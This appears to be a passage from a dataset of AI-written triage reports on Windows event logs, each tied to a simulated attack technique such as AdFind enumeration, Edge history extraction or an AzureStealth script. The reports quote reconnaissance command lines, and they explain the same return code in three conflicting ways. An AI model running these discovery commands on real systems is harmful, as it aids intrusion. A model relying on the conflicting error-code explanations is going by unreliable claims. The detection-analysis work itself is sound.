### Recommended Resolution:

- **SUSPICIOUS**: The activities noted—particularly around network reconnaissance and system time manipulation—require further examination. Follow-up actions should include:
  - Confirming with the system administrator if these actions were expected or part of legitimate network diagnostics.
  - Investigating any additional logs or network flows for corroborating evidence that might indicate lateral movement or further malicious intent.
  - Ensuring that proper endpoint monitoring and alerting mechanisms are in place to catch subsequent suspicious behavior.
  - Conduct a comprehensive review of user access and system changes conducted by the user `admin_test`.

In conclusion, while there are several warning signs, more information is needed to declare this activity as definitively malicious."
Port-Scanning -24 Subnet with PowerShell,"Upon reviewing the provided event logs, the following analysis and findings have been made:

**Suspicious and Anomalous Behavior:**

1. **Time Change Event:**
   - Multiple events indicate a manipulation of the system time. Specifically, EventID 1 in the System log demonstrates that the system time was changed by the `svchost.exe` process. While `svchost.exe` is a legitimate Microsoft Windows system process, unauthorized time changes can sometimes point to an attempt to evade detection in logs by altering timestamps.

2. **PowerShell Activity:**
   - PowerShell was executed with a script containing commands to identify the subnet and open ports (445 and 3389). Event ID 1 in Sysmon logs show powershell.exe with a complex command-line script suggesting network scanning activity that could be indicative of reconnaissance behavior.

3. **High Privilege Execution:**
   - Multiple events (EventID 4672 in the Security log) show assignment of high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` to the user `admin_test`. These privileges allow comprehensive control over the system and are generally unnecessary for normal user activity.

4. **Unexpected Process Activity:**
   - `wevtutil.exe` executed multiple times in a short period. This utility is used to retrieve information about event logs and is invoked by `admin_test`. Frequent invocation without any apparent scheduled task or administrative operation could imply improper usage.

5. **Network Service Execution:**
   - The presence of network service executions, such as `svchost.exe` changing system time and `wevtutil.exe`, alongside PowerShell scripts for scanning purposes from `admin_test`, supports potential lateral movements or preparatory steps for a more extensive operation.

**Assessment:**

The logs indicate suspicious activity due to:
- The use of PowerShell for network reconnaissance.
- Changes to system time, possibly to obfuscate actions.
- High privilege access granted to a user performing potentially malicious operations.
- Repeated execution of system tools in potentially inappropriate contexts.

Given these findings, it is reasonable to conclude that there is potentially unauthorized or unintended activity that warrants further investigation.

**Resolution:**
- **SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Isolate the affected host to prevent potential spread or loss of more data or system integrity.
   - Perform a comprehensive scan for known malware signatures and anomalous behavior.
   - Check for any unauthorized user accounts or escalated privileges.

2. **Further Investigation:**
   - Acquire memory dumps and analyze for any malicious process injections or unauthorized connections.
   - Investigate the origin and intent of the PowerShell script and verify if this aligns with any legitimate administrative task.
   - Review user `admin_test` activity logs for unauthorized access patterns or privilege misuse.

3. **Strengthen Security Posture:**
   - Enforce strict PowerShell logging and script execution policies.
   - Implement two-factor authentication and monitor elevated privileges closely.
   - Regularly review and update security policies to include defenses against lateral movement tactics like these.

4. **Documentation and Reporting:**
   - Ensure detailed documentation of all findings and actions taken.
   - Report the incident as per the organization's security protocols to relevant stakeholders.

Given the potentially malicious activities detected, it is crucial to address these points expeditiously."
Get-WmiObject to Enumerate Domain Controllers,"Based on the analysis of the provided logs, the following activities were observed:

1. **Time Changes and Synchronization**: 
   - Multiple events log the change in system time. This can happen due to time synchronization processes such as NTP (Network Time Protocol) adjustments but should be closely examined since they can also indicate attempts to tamper with logs or system defenses.
   - Event ID 24 from the System log shows a time change managed by `svchost.exe`, linked to the Windows Time Service. There is no immediate evidence suggesting that this action is malicious, particularly given it coincides with time synchronization with an NTP server (""time.windows.com"").

2. **Process Creation and Execution**:
   - There are several events in the Sysmon log related to the creation and use of processes, including `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `whoami.exe`.
   - The `powershell.exe` execution with a command related to querying WMI (via `get-wmiobject`) should prompt further investigation due to Powershell's frequent use in scripting and potential exploitation by attackers. 
   - The extensive execution of `wevtutil.exe` by the `admin_test` user could suggest the enumeration of event logs or their manipulation, potentially indicating attempts to cover tracks.

3. **Privilege Escalation**:
   - Event ID 4672 in the Security log shows the granting of special privileges to `admin_test`. The list of privileges includes several that could allow system manipulation or malicious activities, such as `SeDebugPrivilege` and `SeBackupPrivilege`.

4. **Network Activity**:
   - Logon event 4624 indicates a successful logon using NTLM with an IP address that might need further correlation and investigation to confirm whether this access was legitimate.

5. **Routine System Updates**:
   - Windows Update Client logs in the System channel show the installation of security intelligence updates for Microsoft Defender, which appears to be routine.

6. **Anomalous Activities**:
   - The repeated invocation of `wevtutil.exe` in quick succession and unidentified scripts using PowerShell raise concern. The quick creation and execution of multiple console-related processes (`conhost.exe`) aligned with known system executable use could indicate scripted or automated tasks, possibly used for information gathering or maintaining persistence.

Assessment: **SUSPICIOUS**

While there are elements of routine system maintenance and updates, the significant use of PowerShell and `wevtutil.exe` by an admin user, especially with elevated privileges, suggests potential misuse or an attempt to mask activities. These actions merit further in-depth investigation to confirm whether they are part of legitimate administrative tasks or an indicator of compromise (IoC).

**Recommended Actions**:
- Confirm the legitimacy of the `admin_test` account's actions and assess whether the privileges assigned are necessary.
- Investigate the source and intent of the PowerShell script executed.
- Review access logs and context around the NTLM logon event for unauthorized access verification.
- Conduct an audit of recent changes and entries concerning critical security settings in related logs.
- Consider implementing more advanced monitoring, such as baselining to detect anomalies in usually benign administrative actions."
Security Software Discovery - Windows Firewall Enumeration,"In analyzing the provided Windows event logs, the following observations are made:

### System Log:
- Regular update processes are logged such as the Windows Defender Antivirus updates (`KB2267602`). These entries do not indicate any malicious activity.
  
- A sequence of time change events is logged, indicating updates and synchronizations with external time servers (`time.windows.com`). These events are not uncommon and typically signal regular time synchronization actions.

### Application Log:
- Logs show Windows Defender as being in an active state with no alerts or detections, suggesting no malicious activity from this point.
  
- Updates related to Microsoft Edge are also visible. The stopping of the Edge Update service is logged; this can be typical after an update process completes.

### PowerShell Log:
- There is evidence of PowerShell script execution querying firewall profiles and rules (`Get-NetFirewallProfile`, `Get-NetFirewallSetting`, and `Get-NetFirewallRule`). This could be considered suspicious since such operations can relate to network reconnaissance or security rule parsing. However, more context is needed to understand if this activity is authorized or part of standard administrative operations.

### Security Log:
- Time changes are reflected as security audit events associated with legitimate system processes (`C:\Windows\System32\svchost.exe`).

### Sysmon Log:
- A sequence of legitimate system processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `svchost.exe`, among others are observed.
  
- Microsoft Edge update processes are logged with typical service operations. Network service user identities executing in System integrity level are captured as expected for such operations.
  
- Consistent parent-child relationships such as `wsmprovhost.exe` spawning PowerShell show plausible automated task or system management scripts running.

### Assessment:
The logs indicate relatively normal Windows operations in terms of update sequences and system services management. There are no apparent signs of privilege escalation or unauthorized external command executions identified within these particular logs.

1. **Potential area of interest**:
   - The PowerShell events could warrant further investigation if these actions were not sanctioned administrative tasks or audits. Verification with the IT team or system owners could clarify these details.

### Conclusion:
Based on the current examination of logs:
- The activities in the logs can largely be classified as **BENIGN**. 
- However, due to the presence of PowerShell command usage which could potentially indicate reconnaissance or probing activities, it is advisable to ionvestigate the context surrounding these commands for due diligence.

**Recommended Action**:
- Verify the context and authorization for PowerShell usage noted in the logs to confirm that these are regular administrative tasks.
- Continue monitoring for any repeated unexpected PowerShell or script execution activities to quickly identify potential malicious attempts in the future."
Adfind - Enumerate Active Directory OUs,"### Analysis

Upon reviewing the provided Windows event logs, several entries suggest potentially suspicious activity that warrants further investigation:

#### 1. **Use of `AdFind.exe` for Information Gathering**
   - **Event Record ID 17993** shows the execution of a command using `cmd.exe` to run `AdFind.exe`. This tool is commonly used for querying Active Directory information and could be leveraged by attackers for reconnaissance purposes, especially if found in non-standard locations such as the user's temp directory.

   ```plaintext
   CommandLine: ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -f (objectcategory=organizationalUnit)
   ```

#### 2. **Excessive Process Activity Involving `wevtutil.exe` and `conhost.exe`**
   - Numerous instances of `wevtutil.exe` (event utility tool) and `conhost.exe` (console window host) are observed under the `SERVER002\admin_test` user context. These frequent process creations could indicate an automated script or malicious actor attempting to either query or clear event logs, as `wevtutil.exe` is known for such operations. 

   ```plaintext
   Event Record ID 17966, 17970, 17974, 17978... invoking wevtutil.exe
   ```

#### 3. **Unusual `PowerShell` Activity**
   - **Event Record ID 17962** and **17963** show PowerShell being executed by `SERVER002\admin_test`. While PowerShell is a legitimate administrative tool, it is frequently abused for malicious purposes.

#### 4. **Privilege Escalation Indicator**
   - **Security Event ID 4672** indicates that a high-privilege token was assigned, which includes privileges such as `SeDebugPrivilege` and `SeTcbPrivilege`. These are sensitive; their presence can suggest privilege escalation, particularly when coupled with anomalous behavior.

   ```plaintext
   PrivilegeList: SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, ...
   ```

### Assessment

The activities noted above together raise suspicion, notably due to:
- **Use of tools in non-standard paths:** `AdFind.exe` executed from a non-default directory is unusual and should be verified for legitimacy.
- **High-privilege actions:** Observing sensitive privileges granted suggests potential escalation attempts.
- **Conspicuous execution patterns:** Persistent use of command console and event management utility.

Given these insights, there is potential malicious intent evident throughout the logs.

### Conclusion

**Resolution: SUSPICIOUS**

These findings suggest activity that does not seem entirely legitimate and warrants further investigation to confirm or rule out a compromise. Here are recommended steps to proceed:

1. **Isolate the Host:** To prevent potential spread of any malicious activity.
2. **Conduct a Thorough Forensic Investigation:** Gather additional detail on the processes that invoked `AdFind.exe`, `wevtutil.exe`, and PowerShell commands. Check for any unauthorized access or lateral movement.
3. **Review User Activity:** Validate the user account ""admin_test"" legitimacy and actions during the time of noted events.
4. **Conduct a Malware Scan:** Ensure that the host is not infected with malware that could be leveraging these tools for attack purposes."
Extract Edge Browsing History,"Based on the provided event logs, a detailed analysis reveals a potentially suspicious activity involving Windows PowerShell execution capturing browser history. Here's the breakdown of findings:

### Key Findings:

1. **PowerShell Execution:**
   - The log entries related to PowerShell show a script that uses PowerShell to extract browsing history from Microsoft Edge and save it to a file: `edgebrowsinghistory.txt`.
   - This action is executed with a PowerShell command line: `""powershell.exe"" & {$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&amp;=]*)*?', $History = Get-Content -Path ...}`.
   - The use of PowerShell to access browser data and output it to a text file might indicate data collection or data exfiltration, which can be a component of malicious activity.

2. **Sysmon Logs:**
   - Sysmon logs show execution of PowerShell at high integrity levels under the user `SERVER002\admin_test`. This indicates that the process might have been executed with administrative privileges.
   - The execution and piping out of potentially sensitive data or history logs are executed under a user's context who seems to have elevated privileges.

3. **Legitimate Processes:**
   - Entries in the logs, such as Edge Update, system services, and regular Windows applications (e.g., SearchIndexer), appear to operate normally and less likely to be related to suspicious activity.

4. **No Clear Malicious Artefacts:**
   - While the PowerShell usage is suspicious, no other definitive signs of malware (such as known malware signatures, unauthorized privilege escalations, or modifications to sensitive system files) are explicitly present in the logs.

### Assessment and Resolution:

- **Suspicious Activity:** The execution of PowerShell to extract browser history data is anomalous and not common in standard workloads, especially from the CEO's machine.
- **Needs Further Investigation:** The extraction and storage of browser history should be investigated further to understand the intent and whether any sensitive data could have been compromised or inappropriately accessed.

### Conclusion:

Based on the analysis, the resolution is **SUSPICIOUS**. The activity needs additional investigation to confirm whether it's sanctioned or part of a legitimate administrative task, or if it requires concern for possible data theft or unapproved data collection. It is recommended to:
- Perform checks to determine if this PowerShell script is part of an approved security or administrative procedure.
- Review related security software for any correlated alerts, and check network activity logs for outbound connections during or after the PowerShell script execution timeframe.
- Inform and align with the involved parties, such as IT and security teams, to collaborate and verify user intent."
Process Discovery - Get-Process,"After a thorough analysis of the provided Windows event logs from the CEO's machine, we can observe a sequence of events that raise certain points of interest from a security perspective. Here's a breakdown of the key observations:

1. **Time Modification Events (Kernel-General, Security audit logs)**: There are multiple instances where the system time was altered. The `EventID: 24` in the Kernel-General log corresponds to a system time change, transitioning from an old time to a new time, which is logged almost concurrently with Kernel-General `EventID: 1`. The security audit logs also record this time change with `EventID: 4616`. Time changes aren't necessarily suspicious on their own, as they could result from legitimate synchronization with an NTP server (in this case `time.windows.com`), but it's crucial to confirm that these changes were expected and authorized.

2. **Frequent Execution of System Utilities (Sysmon Logs)**:
   - A significant number of executions of utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` were observed, executed by the user `SERVER002\admin_test`. While `whoami.exe` and `hostname.exe` provide information about the logged-in user and system name, `wevtutil.exe` is used for managing and querying event logs and `conhost.exe` is a console window host.
   - The execution of `wevtutil.exe` multiple times is noteworthy. This utility can be leveraged by attackers to delete event logs or to gather detailed event information, which could be preparatory actions for additional attacks.
   
3. **PowerShell Execution (Sysmon and PowerShell Logs)**:
   - A PowerShell command `powershell.exe & {Get-Process}` was executed by `SERVER002\admin_test`. While this command simply retrieves a list of processes, the use of PowerShell - particularly in contexts involving admin accounts or high integrity levels - is a common trait in attack scenarios, such as data collection or modification of system state.
   
4. **High Privileges Sighting (Security Logs, EventID: 4672)**:
   - The account `admin_test` possessed a range of high-level privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, etc. Presence and exercise of these privileges are expected in an admin context, but need scrutiny if unexpected actions are linked to this account.

**Assessment and Resolution:**
Given the potential for time alteration to mask malicious activities and the system utility executions under a high-privilege account, the activity observed is consistent with a reconnaissance phase in a potential compromise.

- **Resolution**: **SUSPICIOUS**. The activities logged - especially multiple time changes, extensive use of system utilities, and PowerShell command execution - warrant a deeper investigation to determine intent and confirm the legitimacy of the actions by `SERVER002\admin_test`.

**Guidance on How to Proceed:**
- Assess whether the time changes correlate with any authorized system maintenance or updates.
- Interview the user `admin_test` to verify the legitimacy of the actions and the need for the privileges used.
- Review the system's patch status, especially focusing on vulnerabilities that can be escalated using the privileges seen.
- Conduct a deep dive into network logs to check for any unusual data exfiltration or lateral movement activities around the times these logs were generated.
- Consider deploying more granular monitoring temporarily on this user account and the system to capture more context on the activities."
Active Directory Enumeration with LDIFDE,"### Detailed Analysis of the Windows Event Logs

1. **Security Log Analysis:**
   - **EventID 4624 (Logon Success):** Multiple logon events with LogonType=""5"" indicate service logons, which are standard for system services and often occur when services start automatically after reboot or are scheduled.
   - **EventID 4672 (Special Privileges Assigned):** The SYSTEM user was assigned numerous privileges (such as SeDebugPrivilege and SeTakeOwnershipPrivilege), which is normal for critical system operations but can raise concerns if unexpected users are granted these privileges.
   - **EventID 5379 (Credential Validation Failure):** Multiple occurrences where SERVER002$ attempts to validate credentials such as MicrosoftAccount:user and WindowsLive services and fails consistently, returning code 3221226021 (Access Denied). This could imply attempts to use stored credentials or unauthorized access trials.
   - **EventID 4798 (Account Enumeration):** Occurs with SERVER002$, which indicates querying of user accounts. This could be regular system behavior for auditing purposes, but if unexpected, it could be indicative of account reconnaissance by an attacker.

2. **Application Log Analysis:**
   - **EventID 1001 (Windows Error Reporting):** Indicates reporting failures related to CbsPackageServicingFailure2, typical for failed updates or service operations.
   - **EventID 16394 (Software Protection Platform):** Interacts with the Software Protection service, a standard system operation aimed at validating software licenses.

3. **Sysmon Log Analysis:**
   - **Process Activity:** 
     - Executions of `wevtutil.exe`, `cmd.exe`, and `ldifde.exe` by the user `SERVER002\admin_test` reflect advanced operations typically involving event log queries and directory exportations. These need to be scrutinized as they can indicate information gathering or data exfiltration steps.
     - The use of `ldifde.exe` with exports directed to temp files is indicative of user account data extraction, often a precursor to lateral movement or further exploitation.
     - `whoami.exe` and `hostname.exe` usage suggests basic environment recon by an interactive session.
   - **Microsoft Edge Installer Activity:** Logged installation processes for Microsoft Edge updates. These are expected but should be validated against scheduled installations or update policies.

### Assessment and Resolution

The logs illustrate a series of activities that, while appearing automated or part of routine operations, carry indications of potential for abuse:
- The frequent occurrences of attempted credential validations with failure could suggest an automated process or misconfiguration.
- The execution of administration tools (`ldifde.exe`, `wevtutil.exe`) by a non-standard user raises alerts for unauthorized data access and potential data exfiltration efforts.

### Conclusion: **SUSPICIOUS**

The findings from the logs suggest:
- **Suspicious Activities:** Not entirely typical, particularly with the involvement of `ldifde.exe` and repeated failed credential access, warrant further comprehensive investigation to ensure these operations are intended and authorized.
- **Recommended Actions:**
  - **User Activity Audit:** Review recent activities of `SERVER002\admin_test` and validate their legitimacy.
  - **Privilege Use Verification:** Check for recent changes or delegation of administrative privileges around event timestamps to ensure expectedness.
  - **Service and Process Monitoring:** Increase scrutiny on services/processes related to log manipulation and credential accesses.
  - **Further Forensic Analysis:** Consider deep dive into the system utilizing memory dump analysis or advanced auditing to affirm or allay concerns.

It's critical to ensure that such activities are consistent with your organization’s IT policies and verify with the involved personnel if necessary."
Adfind - Enumerate Active Directory Domain Controller Objects,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Indicators of Interest:

1. **PowerShell Execution:**
   - No specific PowerShell commands or script execution details are provided, which is typically an area of interest in security investigations. However, Sysmon events indicate activity in `powershell.exe` by the user `SERVER002\admin_test`.

2. **Application Log:**
   - Two instances of Windows Defender updates being active, which is a benign and expected behavior, showing Windows Defender is turned on and presumably functioning.

3. **System Log:**
   - Logs show security updates for Microsoft Defender Antivirus (KB2267602) were installed, reflecting regular update activity.
   - No unusual activity noted here; security updates indicate maintained system security posture.

4. **Sysmon Log:**
   - There are multiple process creations logged, but there are a few key points to consider:
     - **Administrative User Activity**: Many processes are initiated under the `admin_test` account for instances like `conhost.exe`, `wevtutil.exe`, `taskhostw.exe`, and `cmd.exe`. 
     - **AdFind.exe Execution**: The execution of AdFind.exe, a known tool for Active Directory enumeration, with the command `sc dclist` stands out. This could indicate an attempt to perform directory reconnaissance.
     - **Process Creations for System Utilities**: The logs show standard Windows utilities (`cmd.exe`, `whoami.exe`, `taskhostw.exe`, etc.) running under the administrative account, which are typically benign but are worth noting due to the context.
     - **Edge Update Process**: Multiple instances of Edge-related setup processes, likely indicating a browser update. This aligns with normal system maintenance behavior.

5. **Security Log:**
   - Multiple Event IDs 5379, indicating credential validation attempts with a return code suggesting some sort of failure or rejection. While not inherently malicious, repeated access attempts or failures can be a trail for suspicious activity.

### Assessment:

- **Use of AdFind** and **Process Execution under Admin Context**: The use of AdFind by an administrative user can potentially be an indicator of reconnaissance or monitoring activities that might hint at penetration testing or malicious activity, especially without contextual justification.
  
- **Frequent `wevtutil.exe` executions**: Normally used for event log management, when executed frequently, especially in conjunction with other suspicious activities, could be considered anomalous.

- **Credential Validation Events**: The number of credential accesses with unsuccessful return codes could either be a misconfiguration or attempted unauthorized access, depending on surrounding activities.

### Final Resolution:

Given the information and indicators gathered from the logs:

- The presence of AdFind and command-line utilities under an administrative account looks suspicious.
- The activities highlighted align more with potential reconnaissance or preparation for lateral movement within a network.
  
Therefore, I recommend classifying the event logs as **SUSPICIOUS**.

### Guidance:

1. **Further Investigation**: Conduct a deeper analysis into the activities of the `admin_test` account, verify legitimate use, or perform behavioural analytics to seek other related telemetry data.
2. **Network Traffic Analysis**: Track any related network traffic from `SERVER002` that might connect to potential internal reconnaissance or data exfiltration efforts.
3. **Review Changes and Access**: Examine any recent changes in system configuration or new user roles and permissions to determine if there is unauthorized privilege escalation.
4. **Threat Hunting**: Initiate threat hunting activities focusing on the scope and frequency of similar tool executions (`AdFind`, `wevtutil`, etc.) across the network."
Enumerate Default Domain Admin Details (Domain),"Based on the provided Windows event logs, here's a detailed analysis of potentially suspicious and anomalous activities:

1. **Event 4634 & Event 4624**: 
   - These logs indicate a logoff and logon for the user `admin_test` from a remote session (LogonType 3). The logon uses NTLM authentication from a remote workstation `DESKTOP-3HL5B2P`. Remote logins, especially using NTLM, can be suspicious if unexpected.

2. **Event 4672**:
   - Indicates that the user `admin_test` was granted highly privileged rights such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges allow users to debug and take ownership of any unsecured objects, which can potentially be used to perform unauthorized actions or escalate privileges on the system.

3. **Sysmon Events**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` running with `admin_test` user. While `wevtutil` is a standard utility for managing event logs, its frequent execution without apparent cause might suggest attempts to manipulate logs.
   - The presence of `cmd.exe` running the command `""cmd.exe"" /c net user administrator /domain` indicates attempts to query domain user information, which could be part of reconnaissance activities that precede privilege escalation or lateral movements.
   - The excessive and rapid execution of `MicrosoftEdgeUpdate.exe` is noted, but given that it's executed by `NT AUTHORITY\SYSTEM`, it may represent scheduled update processes rather than a direct indicator of compromise unless there is specific knowledge that this system should not be running these processes.

4. **Execution of Classic Tools**:
   - The use of tools like `hostname.exe` and `whoami.exe`, while not inherently malicious, could indicate gathering of system information by someone investigating the environment manually or through a script.

#### Assessment:

- **SUSPICIOUS**: The logs display a series of activities that do not confirm direct evidence of ongoing malicious activity, but significantly raise suspicion due to the use of privileged accounts for remote logins, excessive execution of utilities (`wevtutil`, `cmd`, `net`), and usage of high privilege tokens. The behavior indicates potential unauthorized reconnaissance and privilege escalation efforts which require further investigation.

#### Guidance on How to Proceed:

1. **Verify Access**: Confirm if `admin_test` user activity matches expected and authorized activities, including verifying the origin of the NTLM authentication.
   
2. **Inspect Utilization**: Investigate the necessity and validity of the `wevtutil.exe` executions and check for possible tampering of event logs.
   
3. **Network Traffic Monitoring**: Examine network logs for unusual traffic patterns, particularly from `DESKTOP-3HL5B2P` or unfamiliar external IPs.

4. **User Behavior Analysis**: Conduct a thorough audit of account activities for `admin_test` and other high-privileged users to detect any irregular patterns or untoward behaviors.

5. **Edge Update Activities**: Confirm with IT whether the observed `MicrosoftEdgeUpdate.exe` processes align with scheduled updates or are anomalous.

Given these findings, research should be conducted to evaluate the potential threats further, focusing on preventing unauthorized access and altering system integrity. Consider employing additional detection mechanisms like IDS/IPS, and reviewing privilege management protocols."
System Network Configuration Discovery (TrickBot Style),"To analyze the Windows event logs for suspicious activity, we need to identify patterns and anomalies that may indicate malicious behavior. Here's the detailed analysis focusing on unusual process executions, privilege escalations, and other patterns:

### Analysis:

1. **Security Logs (EventID 5379):**

   - The logs repeatedly show `EventID 5379` with a `ReturnCode` of `3221226021`, which usually indicates an issue with credential storage or retrieval (STATUS_CANT_ACCESS_DOMAIN_INFO). This can be benign, often occurring due to misconfigured or disabled Microsoft Accounts or Windows Live services. No credentials were returned during these events.

2. **Security Logs (EventID 4624 & 4672):**
   
   - **EventID 4624** indicates a successful logon of the SYSTEM account (SIDs S-1-5-18). The logon type is 5, which is a service startup. This is consistent with normal operations for services on Windows.
   - **EventID 4672** indicates that a privileged account with elevated rights (admin_test) has logged on, possessing several high-level privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege` which are normal for an administrative account but should be carefully monitored.

3. **Sysmon Logs (Process Creations):**

   - There is a significant number of process creations initiated by the SYSTEM account or by the administrator account `admin_test`.
   - Automated actions related to software updates, particularly Microsoft Edge (`setup.exe`), seem commonplace. The command lines used are consistent with normal Edge update processes.

4. **Command Execution:**

   - Processes like `cmd.exe` with various parameters like `ipconfig /all`, `net config workstation`, `net view /all /domain`, and `nltest /domain_trusts` were executed. While these could indicate reconnaissance or enumeration, they might also be part of legitimate system checks or configurations. Given the context, extracted details seem associated with setup and configuration scripts for local networking.

5. **Updates and Installations:**

   - Windows Update Client and `SecurityCenter` logs show multiple successful updates which align with regular maintenance and update patterns seen on enterprise environments. However, the logs might indicate a restart or trigger for scheduling through the Restart Manager and MSI Installer.

6. **Network and Service Activity:**

   - Standard service processes such as `sppsvc.exe` (Software Protection), `svchost.exe` (Service Host), `wevtutil.exe` (Windows Event Utility) are present and operate under expected contexts, such as SYSTEM or NETWORK SERVICE, consistent with routine operations.

### Assessment:
Based on the log analysis, most activities correlate with software updates, system processes, and administrative operations. The elevated privileges observed are typical for administrator accounts, although they should be scrutinized for potential misuse.

### Finding: **SUSPICIOUS**

While there are no overt indicators of compromise, the perimeter of activities conducted, especially the sequence of system and network commands and elevated privileges, coupled with the 'admin_test' user account's involvement, necessitates further investigation to rule out any misuse or unexpected behavior. It is prudent to review more contextual data or alerts to ensure credibility, especially concerning the ""admin_test"" account and associated commands.

### Guidance on How to Proceed:
1. **Monitor for Continuity**: Set up additional monitoring on the ""admin_test"" account for unusual behavior, especially around security-critical operations.
2. **Audit Account Activity**: Cross-check recent activities and scheduling by the ""admin_test"" account to detect any unauthorized access or misconfiguration.
3. **Review Configuration**: Ensure Microsoft Account and Windows Live configurations are correct and check any policy conflicts or recent changes.
4. **Investigate Further**: Review additional logs from the timeframe in question, especially around human-generated interactive logons or other administrative actions.
"
Launch DirLister Executable,"Upon reviewing the provided logs, the investigation reveals the following notable observations:

### Suspicious Activity in the Logs:
1. **Unusual PowerShell Execution:**
   - A PowerShell command was executed with suspicious usage of `Start-Process` to execute `DirLister.exe`, a potential indicative of lateral movement or reconnaissance, commonly used in malicious scripts.
   - Use of `Start-Sleep` and `Stop-Process` around `DirLister` suggests attempts to run and then silently halt a potentially suspicious process.

2. **Activity from Temp Directory:**
   - The execution of `DirLister.exe` from the Temp directory is suspicious as it is an unusual behavior for legitimate programs, often associated with temporary or extracted files used during an attack.

3. **Frequent MicrosoftEdgeUpdate.exe Processes:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` being initiated from various directories, especially unusual ones like Temp directories, with command lines involving service registration (`/regsvc`, `/regserver`), and other administrative commands (`/ua`) raise suspicions of potentially hijacked or malicious activity disguised as legitimate updates.
   - Elevated integrity levels indicate these processes were run with high privileges, which is crucial as privilege escalations are common in compromised systems.

### Benign Activity:

- **Microsoft Edge Update Processes:**
  - Though frequent, some file paths and operations involving `MicrosoftEdgeUpdate.exe` do align with legitimate update activities. Such processes can include high frequency and varied update-related command lines typical for automatic updates.

- **System and Service Level Events:**
  - Many system services appear to be operational without direct context of malicious behavior, like svchost.exe, wermgr.exe, correlating to regular system duties.

### Assessment and Resolution:
Given the unusual and potentially nefarious PowerShell command activity involving `DirLister.exe`, paired with the abnormal behavior of Edge Update in Temp directories, this scenario requires further investigation. Specifically, `DirLister.exe` should be scrutinized for its presence, origin, file signatures, and intent.

**Resolution: SUSPICIOUS**

### Guidance for Proceeding:
1. **Endpoint Review:**
   - Immediately isolate the machine to prevent any potential lateral movement.
   - Review the origin and integrity of `DirLister.exe` through file analysis to identify if it is malicious.

2. **Further Investigation:**
   - Audit all PowerShell logs to trace related script executions or connections.
   - Cross-reference unusual process executions with threat intelligence for potential indicators of compromise.

3. **Security Enhancements:**
   - Increase monitoring on PowerShell executions and behavior anomalies using EDR solutions.
   - Establish stricter application controls on executable launches from Temp directories.

4. **User Verification:**
   - Validate activities performed under `SERVER002\admin_test` to ensure no account compromise.

This approach prioritizes confirming or dismissing possible malicious activity to safeguard other potential network touchpoints."
Azure Security Scan with SkyArk,"**Analysis of Windows Event Logs**

Upon reviewing the provided event logs, the following observations have been made:

### 1. **PowerShell Script Execution**:
   - **PowerShell Event Logs (EventID 600 and 800)** indicate the execution of a script named ""AzureStealth.ps1"" from a temporary directory path (`""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AzureStealth.ps1""`). The script uses PowerShell commands to potentially automate connection attempts to Azure accounts.
   - The script uses `ConvertTo-SecureString` to store a password (`""dataAz""`) and creates a credential object for `Connect-AzAccount` and `Connect-AzureAD`. The script seems to perform actions like `Scan-AzureAdmins`.
   - **Indicators of Concern**: The script's path in the temporary directory and its name (""AzureStealth"") both suggest potential malicious activity aimed at unauthorized cloud access or scanning.

### 2. **Security Privileges**:
   - **Security Event Log (EventID 4672)** indicates that `admin_test` was granted multiple elevated privileges, including `SeDebugPrivilege` and `SeSecurityPrivilege`, which align with actions that could be used by a malicious script for privilege escalation or lateral movement.

### 3. **Remote Login Audit**:
   - **Security Event Log (EventID 4624)** shows a successful network logon (LogonType 3) from IP address `192.168.0.102` using NTLM authentication to the account `admin_test`. This could be legitimate or could represent lateral movement or account compromise, especially given the correlation with elevated privileges.

### 4. **Sysmon Logs**:
   - **Process Creation**: Regular system processes like `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, `csc.exe` and their respective parent processes are recorded. However, the highlight here is the PowerShell execution with suspicious parameters (related to ""AzureStealth.ps1"").
   - **Visual C# Compiler Execution**: Indicates that code may have been dynamically compiled, which is often a tactic of an attacker to evade static analysis.
   - **System Process Oddities**: While system-related processes like `SecureBootEncodeUEFI.exe` are present, they appear with NT AUTHORITY\SYSTEM, suggesting regular system tasks; however, their correlation or timings should be considered alongside other suspicious activities.

**Assessment and Resolution**:
Based on the information extracted from the event logs:
- The use of a PowerShell script (`AzureStealth.ps1`) that handles sensitive credentials and attempts to connect to Azure accounts suggests the potential of unauthorized access or reconnaissance activities in cloud environments.
- Elevated privileges granted to `admin_test` and unusual network logons could indicate attempted lateral movement or compromise.

**Guidance on How to Proceed**:
1. **Immediate Containment**: Quarantine the affected machine (Server002) from the network.
2. **Inquiry and Verification**: Confirm the intent and origin of the `AzureStealth.ps1`. If unknown, suspect it as malicious.
3. **Credential Audit**: Reset credentials for the `admin_test` account and any other potentially affected accounts.
4. **Network Monitoring**: Track connections from `192.168.0.102` or any unusual attempts accessing similar servers.
5. **Further Investigation**: Conduct a comprehensive review of affected file paths and system changes during and after these logs' timestamp.

**Resolution**:
- **MALICIOUS**: The event logs contain multiple indicators of potentially unauthorized access and automated scripted attacks aimed at cloud infrastructures, suggesting a high likelihood of malicious activity."
System Discovery - SocGholish whoami,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior

1. **Security Event Logs:**
   - Multiple Event ID 5379 log entries are observed, linked to failed credential validation attempts. The `ReturnCode` is `3221226021`, which indicates `STATUS_NO_SUCH_LOGON_SESSION`. This might mean there are attempts to access a resource using invalid or expired session credentials.
   - The repeated target is a pseudo or non-existent Microsoft account `02txoixylodcstop`. These repeated attempts, mostly with failures, could signal a brute-force or enumeration attempt using fictitious account names.

2. **Sysmon Logs:**
